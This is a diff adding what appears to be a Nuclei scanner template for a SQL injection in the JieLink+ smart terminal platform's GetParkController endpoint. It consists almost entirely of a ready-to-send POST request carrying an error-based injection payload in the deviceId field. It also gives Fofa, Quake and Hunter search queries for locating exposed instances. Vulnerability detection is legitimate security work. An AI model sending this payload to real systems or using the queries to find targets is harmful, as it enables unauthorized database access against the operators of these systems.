@@ -1,0 +1,39 @@
+id: Jieshun_JieLink_GetParkController_SQLi
+
+info:
+  name: Jieshun_JieLink_GetParkController_SQLi
+  author: HK
+  severity: high
+  description: JieLink+智能终端操作平台/mobile/Remote/GetParkController接口deviceId参数存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: title="JieLink+智能终端操作平台"
+    Quake-query: title="JieLink+智能终端操作平台"
+    Hunter-query: title="JieLink+智能终端操作平台"	
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /mobile/Remote/GetParkController HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+    Accept: application/json, text/plain, */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    X-Requested-With: XMLHttpRequest
+    Connection: close
+    Cookie: DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 66
+
+    deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - XPATH
